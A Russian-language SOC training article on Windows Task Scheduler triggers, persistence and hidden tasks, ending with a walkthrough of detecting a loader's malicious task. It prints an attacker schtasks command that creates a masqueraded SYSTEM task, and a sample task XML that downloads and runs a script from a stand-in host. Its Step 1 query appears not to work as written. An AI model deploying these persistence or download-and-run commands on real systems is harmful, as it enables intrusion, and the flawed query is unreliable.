# Task Scheduler: триггеры и персистентность через задачи

## Контекст и базовые понятия

Планировщик задач Windows (Task Scheduler) — штатный компонент операционной системы, предназначенный для автоматизации запуска программ и сценариев по расписанию или в ответ на события. С точки зрения информационной безопасности он представляет собой критически важный механизм, который злоумышленники регулярно используют для закрепления (persistence) в скомпрометированной среде.

Сам планировщик оперирует несколькими ключевыми сущностями: **задача** (task) содержит одно или несколько **действий** (actions) и один или несколько **триггеров** (triggers), а также **принципала** (principal) — учётную запись, от которой задача выполняется, и набор **условий** (conditions), уточняющих её поведение. Триггер определяет, *когда* и при наступлении *какого события* запускается действие; действие — *что именно* выполняется (запуск исполняемого файла, обработчика COM, отправка почты и т.п.). Именно комбинация «гибкий триггер + произвольное действие» делает Task Scheduler столь привлекательным для атакующих, позволяя добиться регулярного перезапуска вредоносного кода без вмешательства пользователя.

В контексте модели MITRE ATT&CK техника `T1053.005 Scheduled Task` относится к категории Execution, но в практическом плане чаще используется как механизм **сохранения присутствия** после перезагрузки или выхода из системы [cofense.com]. Типичная схема такова: после первоначального проникновения злоумышленник создаёт задачу, которая при входе пользователя в систему или по таймеру запускает загрузчик либо основное тело вредоносной программы, обеспечивая повторный доступ даже после того, как исходный вектор атаки устранён.

Важно разграничить сам **Task Scheduler** (внутреннюю службу и её API) и **инструменты управления** задачами, поскольку начинающие специалисты SOC нередко путают средство создания задачи с механизмом её выполнения. В таблице ниже приведены ключевые различия.

| Сущность | Назначение | Примечание для аналитика |
|----------|------------|--------------------------|
| **Служба Task Scheduler** (`Schedule`) | Ядро, выполняющее задачи согласно триггерам. Работает в фоне как процесс `svchost.exe` с хостом `Schedule`. | Сама служба редко является целью прямого воздействия; злоумышленники работают с её интерфейсами. |
| **schtasks.exe** | Утилита командной строки для создания, удаления, запроса и изменения задач. Поддерживает локальное и удалённое управление. | Наиболее часто используемый инструмент в атаках, оставляет артефакты в журнале `Microsoft-Windows-TaskScheduler/Operational` и в реестре. |
| **PowerShell ScheduledTasks** | Модуль `ScheduledTasks` с командлетами `Register-ScheduledTask`, `New-ScheduledTaskTrigger` и др. | Используется как альтернатива `schtasks.exe`, особенно в сценариях обхода ограничений или в более поздних стадиях атак. |
| **Task Scheduler MMC (taskschd.msc)** | Графический интерфейс управления. | Применяется при интерактивной работе; в атаках может использоваться после получения GUI-доступа (RDP). |
| **COM API (Task Scheduler)** | Программный интерфейс (`ITaskService`, `ITaskDefinition` и т.д.). | Позволяет создавать задачи без вызова отдельных процессов, что усложняет обнаружение на основе командной строки. |
| **XML-файлы задач** | Хранилище определений задач (обычно в `C:\Windows\System32\Tasks`). | Важнейший артефакт для форензики: содержит полную конфигурацию задачи, включая триггеры и действия. |

Сам термин «персистентность через задачи» охватывает не только создание новой задачи, но и модификацию существующей, подмену исполняемого файла в легитимной задаче (task hijacking), а также использование триггеров, привязанных к системным событиям, для запуска вредоносной нагрузки в момент, благоприятный для обхода средств защиты [pentestlab.blog] [cybertriage.com]. Важно понимать, что этот метод не требует обязательного наличия прав администратора: задачи пользовательского уровня могут быть созданы от имени текущего пользователя и будут запускаться в его контексте, что вполне достаточно для функционирования многих вредоносных программ.

## Устройство триггеров и механизмы обеспечения персистентности

Планировщик задач Windows поддерживает широкий спектр триггеров, которые можно разделить на **временны́е** (time-based) и **событийные** (event-based). Каждый тип имеет специфические параметры, влияющие на момент и частоту выполнения задачи, а также на возможности злоумышленника по маскировке вредоносной активности. Ниже приведена сводная таблица всех основных типов триггеров с указанием их свойств, типичных примеров использования в атаках и возможных индикаторов компрометации.

| Тип триггера | Параметры | Типичное использование злоумышленником | Индикаторы / примечания |
|--------------|-----------|----------------------------------------|--------------------------|
| **At startup** (загрузка системы) | Задержка (delay), повторение интервалом | Запуск бэкдора сразу после включения ПК, до входа пользователя. Часто используется для SYSTEM-задач. | Задача выполняется от имени SYSTEM; вредоносный файл может располагаться в нестандартном каталоге. |
| **At logon** (вход пользователя) | Пользователь (конкретный или любой), задержка | Активация кейлоггера или загрузчика при входе жертвы. | Часто маскируется под легитимные имена (напр., `OneDrive`). |
| **On idle** (бездействие) | Продолжительность бездействия | Отложенный запуск, чтобы избежать подозрений при активной работе пользователя. | Редко встречается в чистом виде, чаще как дополнительное условие. |
| **On workstation lock / unlock** | Состояние блокировки | Запуск скрипта при разблокировке (может использоваться для обхода экрана блокировки в сочетании с уязвимостями). | Нетипичное поведение для легитимного ПО. |
| **On event** (событие в журнале) | Журнал, источник, Event ID | Срабатывание на определённое событие безопасности или системное событие (например, запуск определённой службы). Требует включённого аудита. | Высоко-целевая атака; необходимо знание Event ID. Встречается у APT. |
| **Daily** | Время начала, интервал (дни), повторение в течение дня | Выполнение каждый день в заданное время, часто с повторением каждые N минут (обеспечивает частый повтор сеанса). | Классический метод: `schtasks /create /sc daily /mo 1 /tn ...`. |
| **Weekly** | Дни недели, интервал (недели) | Аналогично daily, но с менее частым срабатыванием. | Реже встречается, так как злоумышленники предпочитают более частые проверки. |
| **Monthly / MonthlyDOW** | Месяцы, числа или дни недели | Используется для долгосрочного закрепления с низкой частотой. | Может быть замаскирован под плановое задание обслуживания. |
| **One time** (однократно) | Дата и время | Запуск полезной нагрузки в определённое время (например, атака по расписанию), но часто комбинируется с другими механизмами для повторения. | После выполнения задача может быть удалена или изменена. |
| **At task creation/modification** | – | Выполняется при создании или обновлении задачи. Позволяет сразу запустить вредоносное действие. | Используется для мгновенной активации без ожидания триггера. |
| **On connection to user session** | Подключение локальное или удалённое | Запуск при подключении через RDP или Fast User Switching. | Используется для кражи сеансов или запуска keylogger'а. |
| **On disconnect from user session** | Отключение сеанса | Запуск задачи при отключении пользователя (например, для заметания следов). | Может быть замаскирован под очистку временных файлов. |
| **Custom trigger** | Определяется через COM-интерфейс `ITrigger` с произвольным CLSID | Расширенный вариант, позволяющий использовать сторонние триггеры. | Требует установки дополнительного компонента; встречается редко. |

Механизм **персистентности через задачи** реализуется несколькими типовыми способами. Наиболее простой — создание задачи с триггером `At logon` или `At startup`, которая запускает исполняемый файл или скрипт, размещённый в неприметном месте (папка `%APPDATA%`, `C:\ProgramData`, `C:\Users\Public`). Более продвинутые варианты включают:

- **Маскировку под легитимную задачу**. Злоумышленник создаёт задачу с именем, похожим на системную (например, `Microsoft\Windows\UpdateOrchestrator\UpdateAssistant`), либо помещает её в подпапку существующей ветки задач. Поскольку многие инструменты анализа отображают только имя задачи без полного пути, это усложняет обнаружение [stmxcsr.com].
- **Использование COM-обработчика (ComHandler)**. Вместо прямого указания исполняемого файла задача ссылается на GUID класса COM и параметр, а фактический код находится в зарегистрированной DLL. Это позволяет обходить наивные проверки на основе имени образа.
- **Задания с множественными действиями или триггерами**. Например, задача может содержать легитимное действие (очистка временных файлов) и скрытое вредоносное, причём большинство утилит показывают только первое действие [cybertriage.com]. Аналогично, несколько триггеров повышают надёжность повторного выполнения.
- **Задачи, выполняемые с наивысшими привилегиями (Run with highest privileges)** в сочетании с учётной записью SYSTEM, позволяют обойти UAC и выполнять код в привилегированном контексте [calcomsoftware.com].
- **Удаление дескриптора безопасности (SD) задачи**. Значение реестра `SD` для задачи можно удалить или изменить таким образом, что задача становится невидимой в оснастке Task Scheduler и для `schtasks /query`, оставаясь при этом полностью функциональной. Это достигается через изменение ключа `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\<TaskName>` [stmxcsr.com].

С точки зрения внутреннего устройства, определение задачи хранится в XML-файле в каталоге `C:\Windows\System32\Tasks` (для SYSTEM-задач) или в профиле пользователя (для пользовательских задач). При регистрации задачи планировщик создаёт запись в реестре в упомянутой ветке `Tree`, а также кэширует триггеры и действия для быстрого выполнения. Во время работы служба `Schedule` отслеживает события, соответствующие зарегистрированным триггерам, и порождает процесс `taskeng.exe` (для пользовательских задач) или `taskhostw.exe` (для задач, выполняемых в отдельном процессе) с параметрами, извлечёнными из кэша.

Архитектурно взаимодействие компонентов выглядит так:

```text
[Клиент (schtasks.exe / PowerShell / MMC)] --(COM/RPC)--> [Служба Schedule]
                                                              |
                                                     (чтение/запись)
                                                              |
                                             [Реестр + XML-файлы задач]
                                                              |
                                                 (мониторинг триггеров)
                                                              |
          [Триггер срабатывает] --> [Служба запускает taskeng.exe / taskhostw.exe с контекстом принципала]
```

Эта модель объясняет, почему задача продолжает работать после удаления её XML-файла из папки Tasks, пока соответствующая запись в реестре несинхронизирована (так называемые «сиротские» задачи) — атакующие могут намеренно создавать такие расхождения для обхода очистки.

## Применение и работа с планировщиком в практике SOC

Аналитику уровня L1 необходимо уверенно владеть инструментарием просмотра и анализа запланированных задач, а также распознавать признаки вредоносного использования. Наиболее распространённые операции:

- Получение списка всех задач на хосте: `schtasks /query /fo LIST /v` (вывод подробных сведений) или через PowerShell `Get-ScheduledTask`.
- Поиск задач, запускающих подозрительные исполняемые файлы: перебор действий задач с проверкой пути к образу.
- Анализ событий журнала `Microsoft-Windows-TaskScheduler/Operational`: Event ID 106 (задача создана), 140 (задача обновлена), 141 (задача удалена), 200 (запуск действия), 201 (завершение действия), а также событий безопасности 4698 (создана задача), 4702 (обновлена), 4700 (включена).
- Проверка XML-файлов задач в папках `C:\Windows\System32\Tasks` и `C:\Users\<User>\AppData\Local\Microsoft\Windows\Schedule\TaskCache\Tree`, а также соответствующих ключей реестра.

Рассмотрим практические команды. Начнём с создания задачи злоумышленником — это поможет понять, какие артефакты он оставляет.

Команда создания задачи с двумя триггерами (при загрузке системы и ежедневно) и запуском скрипта PowerShell из скрытой папки:

```powershell
schtasks /create /tn "Microsoft\Windows\SecurityHealth\SecHealthUI" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\Microsoft\Drivers\health.ps1" /sc daily /st 09:00 /ri 30 /du 24:00 /ru SYSTEM /rl HIGHEST /f
```

Параметры:
- `/tn` — имя задачи, маскирующееся под компонент `SecurityHealth`.
- `/tr` — выполняемая команда, запускающая скрытый PowerShell-скрипт.
- `/sc daily /st 09:00` — ежедневно в 9:00.
- `/ri 30 /du 24:00` — повторяться каждые 30 минут в течение суток (фактически постоянное присутствие).
- `/ru SYSTEM /rl HIGHEST` — запуск с максимальными привилегиями от SYSTEM.
- `/f` — подавление предупреждений.

После выполнения команды в журнале появится событие с Event ID 106 в канале TaskScheduler, а в Security — 4698. Аналитик может найти такую задачу, например, с помощью фильтрации на нетипичные параметры: регулярный повтор с высокой частотой, SYSTEM-аккаунт у пользовательской по виду задачи, путь к скрипту в нестандартном каталоге.

Для автоматизированного поиска аномалий в SOC часто используют PowerShell-скрипты, анализирующие свойства задач. Пример выгрузки задач, выполняющихся не из системных каталогов, и с высокой частотой повторения:

```powershell
Get-ScheduledTask | Where-Object { 
    $_.Actions.Execute -and 
    $_.Actions.Execute -notmatch '^(C:\\Windows\\System32|C:\\Program Files)' 
} | ForEach-Object {
    $task = $_
    $triggers = $task.Triggers | Where-Object { $_.Repetition.Interval -ne $null -and $_.Repetition.Interval.TotalMinutes -lt 60 }
    if ($triggers) {
        [PSCustomObject]@{
            TaskName = $task.TaskName
            TaskPath = $task.TaskPath
            Command = $task.Actions.Execute
            RepetitionIntervalMin = $triggers[0].Repetition.Interval.TotalMinutes
        }
    }
}
```

Подобная проверка помогает выявить нетипичные задачи, характерные для троянов-загрузчиков (например, QakBot, создающий задачу с интервалом в 1 минуту [attack.mitre.org]).

Другой важный аспект практической работы — обнаружение «скрытых» задач. Если значение SD удалено, `Get-ScheduledTask` их не покажет, но они присутствуют в реестре. Аналитик может выполнить сравнение содержимого ключа реестра `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree` с выводом `schtasks /query`, либо воспользоваться утилитами вроде `Sysinternals Autoruns`, которая умеет отображать задачи с отсутствующим SD. В качестве иллюстрации, фрагмент команд для экспорта дерева задач из реестра и поиска расхождений:

```cmd
reg export "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree" tasks_reg.txt
```

Далее задача SOC L1 — вручную или с помощью скрипта сопоставить GUID-записей из реестра со списком, полученным через API планировщика, и обратить внимание на задачи, у которых в реестре есть запись, но которые не видны стандартными средствами.

Кроме того, полезно проверять задачи на наличие триггера `On event`, указывающего на нетипичные Event ID. Например, задача может быть настроена на событие 4688 (создание процесса) с фильтром по имени образа — такая техника использовалась для запуска кода при появлении определённого легитимного процесса. Выявление таких задач требует ручного анализа XML или использования расширенных запросов к планировщику.

## Сквозной практический пример: обнаружение персистентной задачи Emotet-подобного загрузчика

**Исходные условия.** После фишинговой атаки на рабочую станцию Windows 10 (сборка 22H2) аналитик SOC L1 получил оповещение от EDR о подозрительном процессе `rundll32.exe`, запущенном из временной папки. Предположительно, произошло закрепление через запланированную задачу. Аналитик выполняет удалённый сбор артефактов с помощью штатных средств и PowerShell Remoting.

**Шаг 1. Получение списка запланированных задач, созданных за последние 24 часа.**  
Используем PowerShell для фильтрации задач по времени создания (свойство `Date` из объекта `CIM_ ScheduledTask`):

```powershell
Get-ScheduledTask | Where-Object {
    $_.TaskPath -notlike '\Microsoft\Windows\*' -and 
    (Get-CimInstance -ClassName Win32_ScheduledJob -Filter "TaskName='$($_.TaskName)'").InstallDate -gt (Get-Date).AddDays(-1)
} | Select TaskName, TaskPath, @{N='InstallDate';E={(Get-CimInstance Win32_ScheduledJob -Filter "TaskName='$($_.TaskName)'").InstallDate}}
```

*Ожидаемый вывод:* одна задача с именем `SysHelper` в пути `\Microsoft\Windows\Shell\`.

**Шаг 2. Извлечение XML-конфигурации подозрительной задачи.**  
Экспортируем XML и анализируем триггеры и действие:

```cmd
schtasks /query /tn "\Microsoft\Windows\Shell\SysHelper" /xml > C:\temp\task.xml
type C:\temp\task.xml
```

*Фрагмент вывода (иллюстративная схема):*
```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <UserId>DOMAIN\jdoe</UserId>
    </LogonTrigger>
    <CalendarTrigger>
      <StartBoundary>2026-11-10T08:00:00</StartBoundary>
      <Repetition>
        <Interval>PT30M</Interval>
        <Duration>P1D</Duration>
      </Repetition>
    </CalendarTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('hxxps://malicious.example.org/updater.ps1')"</Arguments>
    </Exec>
  </Actions>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
</Task>
```

**Шаг 3. Подтверждение запусков задачи через журнал событий.**  
Запрашиваем события запуска действия (Event ID 200) для задачи `\Microsoft\Windows\Shell\SysHelper`:

```powershell
Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-TaskScheduler/Operational'
    ID = 200
} | Where-Object { $_.Properties[0].Value -like '*SysHelper*' } | Select TimeCreated, @{N='Action';E={$_.Properties[0].Value}}, @{N='Result';E={$_.Properties[2].Value}}
```

*Ожидаемый вывод:* несколько записей с интервалом около 30 минут, код результата 0 (успех), что свидетельствует о регулярном выполнении вредоносной команды.

**Шаг 4. Проверка целостности задачи на предмет сокрытия (SD-дескриптор).**  
Проверяем, видна ли задача через API и присутствует ли её ключ в реестре:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\Shell\SysHelper"
```

*Ожидаемый вывод:* ключ существует, содержит подраздел `Id` и значение `SD` — значит, дескриптор безопасности не удалён и задача полностью видна; подтверждается, что злоумышленник не применял метод глубокого сокрытия, а ограничился маскировкой имени.

**Шаг 5. Принятие решения.**  
На основании артефактов: триггеры на вход пользователя и каждые 30 минут, действие — загрузка и выполнение PowerShell-скрипта с удалённого сайта, маскировка под системную ветку `Shell`, принципал SYSTEM с наивысшими правами — аналитик классифицирует задачу как вредоносную (соответствует T1053.005) и инициирует процедуру изоляции хоста и удаления задачи командой `schtasks /delete /tn "\Microsoft\Windows\Shell\SysHelper" /f`.

**Вывод примера:** продемонстрирован типичный цикл обнаружения и анализа персистентной задачи в среде SOC: от первичного поиска аномалий до детального изучения конфигурации и корреляции с событиями выполнения. Кейс наглядно показывает, как знание типов триггеров и стандартных путей маскировки помогает аналитику быстро идентифицировать угрозу.
